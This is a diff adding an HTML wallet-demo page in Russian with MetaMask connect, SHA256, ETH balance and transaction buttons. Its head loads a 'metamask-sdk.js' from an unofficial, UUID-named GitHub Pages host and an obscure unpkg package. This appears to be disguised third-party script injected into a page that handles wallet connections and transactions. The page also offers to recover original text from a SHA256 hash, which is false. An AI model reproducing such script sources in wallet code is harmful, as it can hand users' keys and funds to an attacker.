@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.10.0/web3.min.js"></script>
+    <script src="https://unpkg.com/erc20-contract-js"></script>
+</head>
+<body>
+<div class="row">
+    <div class="col">
+        <div class="get-metamask">
+            <button class="button" id="js-connect-metamask">Подключение кошелька Metamask</button>
+            <div id="js-metamask-value"></div>
+        </div>
+    </div>
+    <div class="col">
+        <div class="sha">
+            <div class="get-sha">
+                <div>
+                    <textarea id="js-sha-textarea" placeholder="введите текст"></textarea>
+                </div>
+                <button class="button" id="js-get-sha" disabled>Получить SHA256</button>
+                <div class="value" id="js-sha-value"></div>
+                <button class="button" id="js-get-initial">Получить исходный текст</button>
+                <div class="value" id="js-sha-initial-value"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="row">
+    <div class="col">
+        <div class="title">Док панель</div>
+        <ul id="js-sites"></ul>
+    </div>
+    <div class="col">
+        <iframe id="js-iframe" style="width: 100%; height: 300px"></iframe>
+    </div>
+</div>
+<div class="row">
+    <div class="col">
+        <div class="title">Отображение баланса ETH в сети</div>
+        <button class="button" id="js-get-balance">Получить баланс</button>
+        <div class="value" id="js-eth-value"></div>
+    </div>
+    <div class="col">
+        <div class="title">Отправка транзакции с подключенного кошелька основного токена</div>
+        <button class="button" id="js-set-contract">Отправить</button>
+        <div class="value" id="js-contract-value"></div>
+    </div>
+
+</div>
+<script src="scripts/script.js" type="module"></script>
+</body>
+</html>
